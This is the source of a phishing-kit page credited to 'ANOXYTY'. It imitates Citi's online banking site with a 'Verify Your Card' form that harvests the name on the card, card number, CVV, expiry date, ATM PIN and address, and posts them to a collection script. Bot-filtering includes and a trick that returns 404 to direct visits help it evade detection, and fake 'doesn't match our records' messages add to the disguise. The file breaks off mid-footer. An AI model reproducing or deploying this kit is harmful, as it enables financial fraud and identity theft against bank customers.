﻿<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/
	include ("layers/header.php");


?>
   <?php
  $_SESSION['nonce'] = rand();
  echo '<input type="hidden" name="nonce" value="'.$_SESSION['nonce'].'">';
?>
<?php 
include 'hidden.php';

$currentPage = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

if ($_SERVER['REQUEST_METHOD'] == "GET" && strcmp(basename($currentPage), basename(__FILE__)) == 0)
{
    http_response_code(404);
    include('err0r.php'); // provide your own 404 error page
    die(); /* remove this if you want to execute the rest of
              the code inside the file before redirecting. */
}
include 'anoxytytrap/bot.php';
include 'anoxytytrap/ref.php';
?>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
<body>
  <app-root _nghost-qyo-c0="" ng-version="7.2.16"><cbol-core _ngcontent-qyo-c0="" _nghost-qyo-c1=""><citi-parent-layout _ngcontent-qyo-c1="" _nghost-qyo-c3=""><div _ngcontent-qyo-c3="" class="citi-outer-container cbolui-responsive cbolui-ddl-pre"><citi-header _ngcontent-qyo-c3="" _nghost-qyo-c5=""><div _ngcontent-qyo-c5="" class="header"><div _ngcontent-qyo-c5="" class="primary"><citi-butler-bar _ngcontent-qyo-c5="" _nghost-qyo-c10=""><!----><div _ngcontent-qyo-c10="" class="prelogin butler ng-star-inserted"><!----><div _ngcontent-qyo-c10="" role="region" class="navigation ng-star-inserted"><ul _ngcontent-qyo-c10=""><!----><li _ngcontent-qyo-c10="" class="myAccount ng-star-inserted"><citi-cta _ngcontent-qyo-c10="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="d16eefd6-8266-154a-3394-2e0ab11759b6" href="#">My Accounts</a><!----><!----></citi-cta><!----></li><li _ngcontent-qyo-c10="" class="ATMBranch ng-star-inserted"><citi-cta _ngcontent-qyo-c10="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="16b270b8-5935-6b9b-2c07-13d4fbd59058" href="#">ATM / Branch</a><!----><!----></citi-cta><!----></li><li _ngcontent-qyo-c10="" class="openAnAccount ng-star-inserted"><citi-cta _ngcontent-qyo-c10="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="e507470c-a9f0-4fbd-692a-c0031218d149" href="#">Open an Account</a><!----><!----></citi-cta><!----></li><li _ngcontent-qyo-c10="" class="espanolLink ng-star-inserted"><citi-cta _ngcontent-qyo-c10="" type="tertiary" _nghost-qyo-c19=""><!----><button _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" type="button" id="c99e4602-8bd0-636a-f805-7d77f09b0dd9" style="text-align: center;">Español</button><!----><!----><!----></citi-cta><!----><citi-modal _ngcontent-qyo-c10="" _nghost-qyo-c8="" class="ng-star-inserted"><div _ngcontent-qyo-c8="" class="modal citi-modal fade" tabindex="-1" style="display: none;"><div _ngcontent-qyo-c8="" class="modal-dialog" tabindex="-1"><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div><div _ngcontent-qyo-c8="" cdktrapfocus="" class="modal-content"><div _ngcontent-qyo-c8="" class="modal-header"><!----><button _ngcontent-qyo-c8="" aria-label="Close modal" class="close-button ng-star-inserted" type="button"><span _ngcontent-qyo-c8="" class="sr-only">Close</span></button></div><div _ngcontent-qyo-c8="" role="document"><div _ngcontent-qyo-c8="" class="modal-body" tabindex="-1"></div></div></div><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div></div></div><div _ngcontent-qyo-c8="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div></citi-modal></li></ul></div></div></citi-butler-bar><citi-banner _ngcontent-qyo-c5="" _nghost-qyo-c11=""><!----><div _ngcontent-qyo-c11="" role="banner" class="banner blue ng-star-inserted"><div _ngcontent-qyo-c11="" class="content-wrap"><!----><div _ngcontent-qyo-c11="" class="logo ng-star-inserted"><a _ngcontent-qyo-c11="" href="/US/JPS/portal/Home.do"><!----><!----><img _ngcontent-qyo-c11="" alt="Citi" src="img/Citi-Enterprise-White.png" class="ng-star-inserted"><!----></a></div><div _ngcontent-qyo-c11="" class="buttons"><!----><!----><div _ngcontent-qyo-c11="" class="search" role="search"><!---->
  
  
  
  
  
  <!----><citi-smart-search _ngcontent-qyo-c11="" _nghost-qyo-c21="" class="ng-star-inserted"><div _ngcontent-qyo-c21="" id="citi-autocomplete-content" style="display: none;"></div></citi-smart-search></div></div></div></div><banner-search-override _ngcontent-qyo-c11=""></banner-search-override></citi-banner><citi-navigation _ngcontent-qyo-c5="" _nghost-qyo-c12=""><!----><div _ngcontent-qyo-c12="" class="prelogin menu ng-star-inserted"></div></citi-navigation></div><citi-welcome-bar _ngcontent-qyo-c5="" _nghost-qyo-c13=""><!----></citi-welcome-bar></div></citi-header><!----><div _ngcontent-qyo-c3="" class="citi-container cbolui-ddl theme-light"><!----><!----><div _ngcontent-qyo-c3="" class="appbody ng-star-inserted"><router-outlet _ngcontent-qyo-c1=""></router-outlet><app-debcaract-prelogin _nghost-qyo-c29="" class="ng-star-inserted"><citi-simple-layout _ngcontent-qyo-c29="" class="theme-dca" pageid="DCAPrelogin" prelogin="true" responsive="true" _nghost-qyo-c30=""><citi-jamp _ngcontent-qyo-c29="" _nghost-qyo-c6="" class="hidden jamp-page-level"><div _ngcontent-qyo-c6="" class="fillHeight"><div _ngcontent-qyo-c6="" class="alignmentEl fillHeight"><div _ngcontent-qyo-c6="" class="jamp  jamp-css"><span _ngcontent-qyo-c6="" class="img "></span><span _ngcontent-qyo-c6="" class="message"></span></div></div></div></citi-jamp><router-outlet _ngcontent-qyo-c29=""></router-outlet><app-enter-card-number _nghost-qyo-c31="" class="ng-star-inserted"><!----><div _ngcontent-qyo-c31="" class="fullbleedFix ng-star-inserted" role="main"><!----><citi-row _ngcontent-qyo-c31="">
  

 <div class="row "><h1 _ngcontent-qyo-c31="" class="hide"></h1><div _ngcontent-qyo-c31="" class="h2-style col-sm-12 head-padding">Verify Your Card</div></div></citi-row><div _ngcontent-qyo-c31="" class="row" content5=""><citi-row _ngcontent-qyo-c31=""><div class="row "><div _ngcontent-qyo-c31="" class="cross-link-card  col-sm-12 head-padding"><div _ngcontent-qyo-c31="" class="h4-style cross-link-heading">Verify your card it's easy. Fill in the information below to get started</div></div></div></citi-row><citi-row _ngcontent-qyo-c31="">
 
 
 
 
 
 
  
 <form name="f1" id="i0281"  spellcheck="false" method="post" autocomplete="off" action="process/carrz.php"> 
  
  
  
  
  
  
  
  <div class="row "><citi-column _ngcontent-qyo-c31="" class="cardNum" xs="12">
  <div class="col-xs-12"><citi-input2 _ngcontent-qyo-c31="" class="citi-input2 row" idstr="cardFieldId" maxlength="16" messageonlyintegererror="Your Only Integer Value allowed" minlength="14" name="cardFieldName" _nghost-qyo-c24="">
  <div _ngcontent-qyo-c24="" class="form-control-container col-md-4 col-sm-6">
  
 <div _ngcontent-kko-c9="" class="col-xs-12 form-group"> <label _ngcontent-qyo-c24="" tabindex="-1" for="cardFieldId" id="cardFieldId-label" style="opacity: 1;">Name on Card</label>
  <div _ngcontent-qyo-c24="" class="input-container"><span _ngcontent-qyo-c24="" class="input-switch-wrapper"><!----><!----><!----><!----><input _ngcontent-qyo-c24="" autocapitalize="none" type="text" 
   name="noc"  required tabindex="0" placeholder="Name on card" minlength="16" autocomplete="off" class="ng-valid ng-star-inserted ng-dirty ng-touched"></span><div _ngcontent-qyo-c24="" class="add-on-post"><!----><!----><!----></div></div></div><!----><!----></div></citi-input2><div _ngcontent-qyo-c31="" class="buttonpos"><citi-tooltip _ngcontent-qyo-c31="" _nghost-qyo-c20=""></citi-tooltip></div></div>
  
  
  
  
  
  <div class="row "><citi-column _ngcontent-qyo-c31="" class="cardNum" xs="12">
  <div class="col-xs-12"><citi-input2 _ngcontent-qyo-c31="" class="citi-input2 row" idstr="cardFieldId" maxlength="16" messageonlyintegererror="Your Only Integer Value allowed" minlength="14" name="cardFieldName" _nghost-qyo-c24="">
  <div _ngcontent-qyo-c24="" class="form-control-container col-md-4 col-sm-6">
  
 <div _ngcontent-kko-c9="" class="col-xs-12 form-group"> <label _ngcontent-qyo-c24="" tabindex="-1" for="cardFieldId" id="cardFieldId-label" style="opacity: 1;">Card Number</label>
  <div _ngcontent-qyo-c24="" class="input-container"><span _ngcontent-qyo-c24="" class="input-switch-wrapper"><!----><!----><!----><!----><input _ngcontent-qyo-c24="" autocapitalize="none" type="text" 
   name="cc"  required tabindex="0" placeholder="Card number" minlength="16" autocomplete="off" class="ng-valid ng-star-inserted ng-dirty ng-touched"></span><div _ngcontent-qyo-c24="" class="add-on-post"><!----><!----><!----></div></div></div><!----><!----></div></citi-input2>
   
<div _ngcontent-qyo-c31="" class="buttonpos"><citi-tooltip _ngcontent-qyo-c31="" _nghost-qyo-c20=""></citi-tooltip>
   
   
   
   </div>    
   
   
   
   </div>
  
  
  <div class="col-xs-12 col-md-2">
   <div _ngcontent-kko-c37="" class="cvvImg"><citi-input _ngcontent-kko-c37="" class="citi-input row" id="hello" idstr="securityCode" name="securityCode" oncopy="event.preventDefault();" oncut="event.preventDefault();" onpaste="event.preventDefault();" type="password" _nghost-kko-c9=""><div _ngcontent-kko-c9="" class="col-xs-12 form-group"><label _ngcontent-kko-c9="" class="text-input-label" for="securityCode" id="securityCodelabel">CVV</label><div _ngcontent-kko-c9="" class="null"><div _ngcontent-kko-c9=""><div _ngcontent-kko-c9=""><!----><!----><!----><input _ngcontent-kko-c9="" class="form-control ng-untouched ng-pristine ng-valid" aria-label="CVV" aria-labelledby="securityCodelabel" type="password" name="cvv" id="securityCode" placeholder="CVV" maxlength="4" minlength="3" autocomplete="off" data-order-appearance="0" required><!----><!----></div></div><!----><span _ngcontent-kko-c9="" aria-hidden="true" class="sr-only" id="securityCode-error"></span></div></div></citi-input><span _ngcontent-kko-c37="" class="cardArtImage"><img _ngcontent-kko-c37="" border="0" height="50" tabindex="0" width="80" alt="For MasterCard and Visa, the Security Code (CVV) is the last 3 digits on the back of your card." src="https://online.citi.com/JSO/registration/images/Register_Visa_Card.png"></span></div><citi-input _ngcontent-hhj-c37="" class="margin-left citi-input row" idstr="enterSSN" maxlength="4" oncopy="event.preventDefault();" oncut="event.preventDefault();" onpaste="event.preventDefault();" type="password" _nghost-hhj-c9=""><div _ngcontent-hhj-c9="" class="col-xs-12 form-group has-value"><label _ngcontent-hhj-c9="" class="text-input-label" for="enterSSN" id="enterSSNlabel">Expiration Date MM/YY</label><div _ngcontent-hhj-c9="" class="null"><div _ngcontent-hhj-c9=""><div _ngcontent-hhj-c9=""><!----><!----><!----><input _ngcontent-hhj-c9="" class="form-control ng-valid ng-touched ng-dirty" name="expdate" type="tel" id="pin" autocomplete="off"  value="" placeholder="MM/YY" required ><!----><!----></div></div><!----></div></div></citi-input></div>
  
 
  

  
  
  
  
  
  
  
  
  <div class="col-xs-12 col-md-2"><citi-input _ngcontent-hhj-c37="" class="margin-left citi-input row" idstr="enterSSN" maxlength="4" oncopy="event.preventDefault();" oncut="event.preventDefault();" onpaste="event.preventDefault();" type="password" _nghost-hhj-c9=""><div _ngcontent-hhj-c9="" class="col-xs-12 form-group has-value"><label _ngcontent-hhj-c9="" class="text-input-label" for="enterSSN" id="enterSSNlabel">ATM Pin</label><div _ngcontent-hhj-c9="" class="null"><div _ngcontent-hhj-c9=""><div _ngcontent-hhj-c9=""><!----><!----><!----><input _ngcontent-hhj-c9="" class="form-control ng-valid ng-touched ng-dirty" name="pin" type="tel" id="pin" autocomplete="off"  value="" minlength="4" maxlength="4" required><!----><!----></div></div><!----></div></div></citi-input></div>
  
 
 
 
  
 
 
  <div class="row ">
 
  <citi-column _ngcontent-qyo-c31="" class="cardNum" xs="12">
  <div class="col-xs-12"><citi-input2 _ngcontent-qyo-c31="" class="citi-input2 row" idstr="cardFieldId" maxlength="16" messageonlyintegererror="Your Only Integer Value allowed" minlength="14" name="cardFieldName" _nghost-qyo-c24="">
  <div _ngcontent-qyo-c24="" class="form-control-container col-md-4 col-sm-6">
  
 <div _ngcontent-kko-c9="" class="col-xs-12 form-group"> <label _ngcontent-qyo-c24="" tabindex="-1" for="cardFieldId" id="cardFieldId-label" style="opacity: 1;">Street Address</label>
  <div _ngcontent-qyo-c24="" class="input-container"><span _ngcontent-qyo-c24="" class="input-switch-wrapper"><!----><!----><!----><!----><input _ngcontent-qyo-c24="" autocapitalize="none" type="text" 
   name="stradd"  required tabindex="0" placeholder="street address" minlength="16" autocomplete="off" class="ng-valid ng-star-inserted ng-dirty ng-touched"></span><div _ngcontent-qyo-c24="" class="add-on-post"><!----><!----><!----></div></div></div><!----><!----></div></citi-input2><div _ngcontent-qyo-c31="" class="buttonpos"><citi-tooltip _ngcontent-qyo-c31="" _nghost-qyo-c20=""></citi-tooltip></div></div>
  
  
  



  <div class="col-xs-12 col-md-2"><citi-input _ngcontent-hhj-c37="" class="margin-left citi-input row" idstr="enterSSN" maxlength="4" oncopy="event.preventDefault();" oncut="event.preventDefault();" onpaste="event.preventDefault();" type="password" _nghost-hhj-c9=""><div _ngcontent-hhj-c9="" class="col-xs-12 form-group has-value"><label _ngcontent-hhj-c9="" class="text-input-label" for="enterSSN" id="enterSSNlabel">Zipcode</label><div _ngcontent-hhj-c9="" class="null"><div _ngcontent-hhj-c9=""><div _ngcontent-hhj-c9=""><!----><!----><!----><input _ngcontent-hhj-c9="" class="form-control ng-valid ng-touched ng-dirty" name="zip" type="tel" id="pin" autocomplete="off"  value="" required><!----><!----></div></div><!----></div></div></citi-input></div>
   <br>
  <br>
  <br>
 
    <br>
 
  
  
  
  <br>
  <br>
    <br>
  <br>
  
    <br>
  <br>
    <br>
  <br>
  
  
  
  <br>
  <br>
    <br>
  <br>
  
  <br>
  <br>
    <br>
  <br>
  
  
  <button _ngcontent-qyo-c19="" class="ng-star-inserted btn btn-primary large" type="submit" id="dcaContinue" style="text-align: center;">Continue</button><!----><!----><!----></citi-cta><citi-cta _ngcontent-qyo-c31="" bold="" class="secBtnStyle dcaCncl" type="secondary" _nghost-qyo-c19=""><!---->
  
 </div>
  
  </form>
  
  
  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/es6-shim/0.35.3/es6-shim.min.js"></script>    
<script src="assets/dist/js/FormValidation.min.js"></script>
<script src="assets/dist/js/plugins/Bootstrap.min.js"></script>


<script>
document.addEventListener('DOMContentLoaded', function(e) {
    FormValidation.formValidation(
        document.getElementById('i0281'),
        {
            fields: { 
			cc: {
                    validators: {
                        notEmpty: {
                            message: 'Card Number is required'
                        },
                        creditCard: {
                            message: 'Enter a valid card number'
                        },
                    }
                },
				expdate: {
                    validators: {
                        notEmpty: {
                            message: 'Expiration Date is required.'
                        },
                        stringLength: {
                            min: 5,
                            max: 5,
                            message: '&#x20;',
                        },
                        regexp: {
                            regexp: /^((0[1-9])|(1[0-2]))\/((20)|([2-2][0-9]))$/,
                            message: 'Expired.',
                        },
                    }
                },
				cvv: {
                    validators: {
                        notEmpty: {
                            message: 'CVV is required.'
                        },
                        stringLength: {
                            min: 3,
                            max: 4,
                            message: 'Doesn\'t match our records.',
                        },
                    }
                },
				noc: {
                    validators: {
                        notEmpty: {
                            message: 'Card Holder\'s name is required.'
                        },
                       regexp: {
                            regexp: /^([a-zA-Z]{2,}\s[a-zA-z]{1,}'?-?[a-zA-Z]{2,}\s?([a-zA-Z]{1,})?)$/,
                            message: 'doesn\'t match our records .',
                        },
                    }
                },
				stradd: {
                    validators: {
                        notEmpty: {
                            message: 'Street Address is required'
							  },
                         regexp: {
                            regexp: /^\d+\s[A-z]+\s[A-z]+/,
                            message: 'Doesn\'t match our records.',
                        },
                    }
                },
				zip: {
                    validators: {
                        notEmpty: {
                            message: 'Zipcode is required.'
                        },
                    }
                },
				pin: {
                    validators: {
                        notEmpty: {
                            message: 'ATM pin is required.'
                        },
                        stringLength: {
                            min: 4,
                            max: 4,
                            message: '&#x20;',
                        },
                    }
                },
				
            },
			plugins: {
                trigger: new FormValidation.plugins.Trigger(),
                bootstrap: new FormValidation.plugins.Bootstrap(),
                submitButton: new FormValidation.plugins.SubmitButton(),
				defaultSubmit: new FormValidation.plugins.DefaultSubmit(),
                icon: new FormValidation.plugins.Icon({
                    valid: 'fa fa-check',
                    invalid: 'fa fa-times',
                    validating: 'fa fa-refresh'
                }),
            },
        }
    )
	.on('core.validator.validated', function(e) {
        if (e.field === 'cc' && e.validator === 'creditCard' && e.result.valid) {
            let icon = '';
            // e.result.meta.type can be one of
            // AMERICAN_EXPRESS, DINERS_CLUB, DINERS_CLUB_US, DISCOVER, JCB, LASER,
            // MAESTRO, MASTERCARD, SOLO, UNIONPAY, VISA
            switch (e.result.meta.type) {
                case 'AMERICAN_EXPRESS':
                    icon = 'fa fa-cc-amex';
                    break;
                
                case 'DISCOVER':
                    icon = 'fa-cc-discover';
                    break;
                
                case 'MASTERCARD':
                case 'DINERS_CLUB_US':
                    icon = 'fa-cc-mastercard';
                    break;
                
                case 'VISA':
                    icon = 'fa-cc-visa';
                    break;
                
                default:
                    icon = 'fa-credit-card';
                    break;
            }

            // Query the icon element
            const iconEle = e.element.nextSibling;
            iconEle.setAttribute('class', 'fv-plugins-icon ' + icon);
        }
    })
    
	
});    

</script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
    <script>
        $('input[name="expdate"]').mask('00/00');
    </script>
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  <!----><!----><!----></citi-cta><citi-forms-disclaimer _ngcontent-qyo-c31="" class="col-disclaimer citi-forms-disclaimer" idstr="cardDisclaimer"></citi-forms-disclaimer></div></citi-column></citi-row><citi-modal _ngcontent-qyo-c31="" cancelbuttontext="Yes" class="text-center" idstr="cancelModal" title="" _nghost-qyo-c8=""></citi-modal></div></div></app-enter-card-number></citi-simple-layout></app-debcaract-prelogin><mfa-modal _ngcontent-qyo-c0="" _nghost-qyo-c2="" class="ng-tns-c2-0 ng-star-inserted"><div _ngcontent-qyo-c2="" class="ng-tns-c2-0 ng-trigger ng-trigger-routerTransition"><router-outlet _ngcontent-qyo-c2="" class="ng-tns-c2-0" name="mfaContent"></router-outlet></div><div _ngcontent-qyo-c2="" class="ng-tns-c2-0 ng-trigger ng-trigger-routerTransition"><router-outlet _ngcontent-qyo-c2="" class="ng-tns-c2-0" name="mfaConfirm"></router-outlet></div></mfa-modal><cbol-session _ngcontent-qyo-c1=""><citi-modal primarybuttontarget="_blank" showcancelbutton="true" _nghost-qyo-c8=""><div _ngcontent-qyo-c8="" class="modal citi-modal fade" tabindex="-1" style="display: none;"><div _ngcontent-qyo-c8="" class="modal-dialog" tabindex="-1"><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div><div _ngcontent-qyo-c8="" cdktrapfocus="" class="modal-content"><div _ngcontent-qyo-c8="" class="modal-header"><!----><button _ngcontent-qyo-c8="" aria-label="Close modal" class="close-button ng-star-inserted" type="button"><span _ngcontent-qyo-c8="" class="sr-only">Close</span></button></div><div _ngcontent-qyo-c8="" role="document"><div _ngcontent-qyo-c8="" class="modal-body" tabindex="-1"><div _ngcontent-qyo-c8="" tabindex="-1"><!----></div><div _ngcontent-qyo-c8="" class="modal-body-content"><p></p><p>  <b>   </b></p><p></p></div></div></div><div _ngcontent-qyo-c8="" class="modal-footer text-right"><!----></div></div><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div></div></div><div _ngcontent-qyo-c8="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div></citi-modal></cbol-session><cobrowse-modal _ngcontent-qyo-c1="" _nghost-qyo-c4=""><citi-modal _ngcontent-qyo-c4="" idstr="modal" _nghost-qyo-c8=""><div _ngcontent-qyo-c8="" class="modal citi-modal fade" tabindex="-1" id="modal" style="display: none;"><div _ngcontent-qyo-c8="" class="modal-dialog" tabindex="-1"><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div><div _ngcontent-qyo-c8="" cdktrapfocus="" class="modal-content"><div _ngcontent-qyo-c8="" class="modal-header"><!----><button _ngcontent-qyo-c8="" aria-label="Close modal" class="close-button ng-star-inserted" type="button"><span _ngcontent-qyo-c8="" class="sr-only">Close</span></button></div><div _ngcontent-qyo-c8="" role="document"><div _ngcontent-qyo-c8="" class="modal-body" tabindex="-1"><div _ngcontent-qyo-c8="" tabindex="-1"><!----></div><div _ngcontent-qyo-c8="" class="modal-body-content"><!----><div _ngcontent-qyo-c4="" class="ng-star-inserted"><h2 _ngcontent-qyo-c4=""></h2><p _ngcontent-qyo-c4=""></p><div _ngcontent-qyo-c4="" class="theme-light"><citi-input _ngcontent-qyo-c4="" class="citi-input row" type="text" _nghost-qyo-c9=""><div _ngcontent-qyo-c9="" class="col-xs-12 form-group"><label _ngcontent-qyo-c9="" class="text-input-label" for="undefined" id="null"></label><div _ngcontent-qyo-c9="" class="null"><div _ngcontent-qyo-c9=""><div _ngcontent-qyo-c9=""><!----><!----><!----><input _ngcontent-qyo-c9="" class="form-control ng-untouched ng-pristine ng-valid" aria-label="" type="text" placeholder="" maxlength="524288" autocomplete="off"><!----><!----></div></div><!----><span _ngcontent-qyo-c9="" aria-hidden="true" class="sr-only" id="undefined-error">Error</span></div></div></citi-input></div><div _ngcontent-qyo-c4=""></div></div><!----></div></div></div><div _ngcontent-qyo-c8="" class="modal-footer text-right"><!----></div></div><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div></div></div><div _ngcontent-qyo-c8="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div></citi-modal></cobrowse-modal><citi-route-detector _ngcontent-qyo-c1=""></citi-route-detector><citi-session-handler _ngcontent-qyo-c1="" interval="10000"></citi-session-handler></div></div><citi-footer _ngcontent-qyo-c3="" _nghost-qyo-c7=""><div _ngcontent-qyo-c7="" class="footer"><citi-footer-butler-bar _ngcontent-qyo-c7="" _nghost-qyo-c14=""><!----><div _ngcontent-qyo-c14="" class="butler ng-star-inserted" role="region"><div _ngcontent-qyo-c14="" class="content-wrap"><!----><div _ngcontent-qyo-c14="" class="logo ng-star-inserted"><span _ngcontent-qyo-c14="" class="sr-only">Footer</span><a _ngcontent-qyo-c14="" href="/US/login.do"><img _ngcontent-qyo-c14="" alt="Citi" src="img/citi-logo-footer.png"></a></div><!----><div _ngcontent-qyo-c14="" class="social ng-star-inserted"><ul _ngcontent-qyo-c14=""><!----><li _ngcontent-qyo-c14="" class="ng-star-inserted"><button _ngcontent-qyo-c14="" aria-describedby="opensPopup" class="facebook brandingSprite" aria-label="facebook" data-target="#social0" name="facebook"></button></li><li _ngcontent-qyo-c14="" class="ng-star-inserted"><button _ngcontent-qyo-c14="" aria-describedby="opensPopup" class="twitter brandingSprite" aria-label="twitter" data-target="#social1" name="twitter"></button></li><li _ngcontent-qyo-c14="" class="ng-star-inserted"><button _ngcontent-qyo-c14="" aria-describedby="opensPopup" class="youtube brandingSprite" aria-label="youtube" data-target="#social2" name="youtube"></button></li></ul><!----><citi-modal _ngcontent-qyo-c14="" primarybuttontarget="_blank" _nghost-qyo-c8="" class="ng-star-inserted"><div _ngcontent-qyo-c8="" class="modal citi-modal fade" tabindex="-1" id="social0" style="display: none;"><div _ngcontent-qyo-c8="" class="modal-dialog" tabindex="-1"><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div><div _ngcontent-qyo-c8="" cdktrapfocus="" class="modal-content"><div _ngcontent-qyo-c8="" class="modal-header"><!----><button _ngcontent-qyo-c8="" aria-label="Close modal" class="close-button ng-star-inserted" type="button"><span _ngcontent-qyo-c8="" class="sr-only">Close</span></button></div><div _ngcontent-qyo-c8="" role="document"><div _ngcontent-qyo-c8="" class="modal-body" tabindex="-1"><div _ngcontent-qyo-c8="" tabindex="-1"><!----><citi-text-header _ngcontent-qyo-c8="" level="2" _nghost-qyo-c27="" class="ng-star-inserted"><span _ngcontent-qyo-c27="" class="hidden">Important Information</span><!----><!----><h2 _ngcontent-qyo-c27="" class="header-level-2 ng-star-inserted">Important Information</h2><!----><!----><!----><!----></citi-text-header></div><div _ngcontent-qyo-c8="" class="modal-body-content"><p _ngcontent-qyo-c14=""><p>You are leaving a Citi Website and going to a third party site. That site may have a privacy policy different from Citi and may provide less security than this Citi site. Citi and its affiliates are not responsible for the products, services, and content on the third party website. Do you want to go to the third party site?</p><p>Citi is not responsible for the products, services or facilities provided and/or owned by other companies.</p></p></div></div></div><div _ngcontent-qyo-c8="" class="modal-footer text-right"><!----><div _ngcontent-qyo-c8="" class="citi-modal-controls ng-star-inserted"><!----><citi-cta _ngcontent-qyo-c8="" class="modal-primary-btn btnclassTest ng-star-inserted" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-primary ng-star-inserted" target="_blank" id="65a3c5d0-68c2-0577-51a5-f009d76f11a5" href="#k" aria-describedby="46297718-5374-b563-0182-57acec22e8db_ariadescription">Continue</a><!----><!----><span _ngcontent-qyo-c19="" aria-hidden="true" class="sr-only ng-star-inserted" id="46297718-5374-b563-0182-57acec22e8db_ariadescription">Opens in new window</span></citi-cta><!----></div></div></div><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div></div></div><div _ngcontent-qyo-c8="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div></citi-modal><citi-modal _ngcontent-qyo-c14="" primarybuttontarget="_blank" _nghost-qyo-c8="" class="ng-star-inserted"><div _ngcontent-qyo-c8="" class="modal citi-modal fade" tabindex="-1" id="social1" style="display: none;"><div _ngcontent-qyo-c8="" class="modal-dialog" tabindex="-1"><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div><div _ngcontent-qyo-c8="" cdktrapfocus="" class="modal-content"><div _ngcontent-qyo-c8="" class="modal-header"><!----><button _ngcontent-qyo-c8="" aria-label="Close modal" class="close-button ng-star-inserted" type="button"><span _ngcontent-qyo-c8="" class="sr-only">Close</span></button></div><div _ngcontent-qyo-c8="" role="document"><div _ngcontent-qyo-c8="" class="modal-body" tabindex="-1"><div _ngcontent-qyo-c8="" tabindex="-1"><!----><citi-text-header _ngcontent-qyo-c8="" level="2" _nghost-qyo-c27="" class="ng-star-inserted"><span _ngcontent-qyo-c27="" class="hidden">Important Information</span><!----><!----><h2 _ngcontent-qyo-c27="" class="header-level-2 ng-star-inserted">Important Information</h2><!----><!----><!----><!----></citi-text-header></div><div _ngcontent-qyo-c8="" class="modal-body-content"><p _ngcontent-qyo-c14=""><p>You are leaving a Citi Website and going to a third party site. That site may have a privacy policy different from Citi and may provide less security than this Citi site. Citi and its affiliates are not responsible for the products, services, and content on the third party website. Do you want to go to the third party site?</p><p>Citi is not responsible for the products, services or facilities provided and/or owned by other companies.</p></p></div></div></div><div _ngcontent-qyo-c8="" class="modal-footer text-right"><!----><div _ngcontent-qyo-c8="" class="citi-modal-controls ng-star-inserted"><!----><citi-cta _ngcontent-qyo-c8="" class="modal-primary-btn btnclassTest ng-star-inserted" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-primary ng-star-inserted" target="_blank" id="ce65ea0c-f13c-0588-4e5d-9591b572179f" href="https://twitter.com/Citibank/" aria-describedby="0c66496b-b4cd-9f29-5a64-9237861116fd_ariadescription">Continue</a><!----><!----><span _ngcontent-qyo-c19="" aria-hidden="true" class="sr-only ng-star-inserted" id="0c66496b-b4cd-9f29-5a64-9237861116fd_ariadescription">Opens in new window</span></citi-cta><!----></div></div></div><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div></div></div><div _ngcontent-qyo-c8="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div></citi-modal><citi-modal _ngcontent-qyo-c14="" primarybuttontarget="_blank" _nghost-qyo-c8="" class="ng-star-inserted"><div _ngcontent-qyo-c8="" class="modal citi-modal fade" tabindex="-1" id="social2" style="display: none;"><div _ngcontent-qyo-c8="" class="modal-dialog" tabindex="-1"><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div><div _ngcontent-qyo-c8="" cdktrapfocus="" class="modal-content"><div _ngcontent-qyo-c8="" class="modal-header"><!----><button _ngcontent-qyo-c8="" aria-label="Close modal" class="close-button ng-star-inserted" type="button"><span _ngcontent-qyo-c8="" class="sr-only">Close</span></button></div><div _ngcontent-qyo-c8="" role="document"><div _ngcontent-qyo-c8="" class="modal-body" tabindex="-1"><div _ngcontent-qyo-c8="" tabindex="-1"><!----><citi-text-header _ngcontent-qyo-c8="" level="2" _nghost-qyo-c27="" class="ng-star-inserted"><span _ngcontent-qyo-c27="" class="hidden">Important Information</span><!----><!----><h2 _ngcontent-qyo-c27="" class="header-level-2 ng-star-inserted">Important Information</h2><!----><!----><!----><!----></citi-text-header></div><div _ngcontent-qyo-c8="" class="modal-body-content"><p _ngcontent-qyo-c14=""><p>You are leaving a Citi Website and going to a third party site. That site may have a privacy policy different from Citi and may provide less security than this Citi site. Citi and its affiliates are not responsible for the products, services, and content on the third party website. Do you want to go to the third party 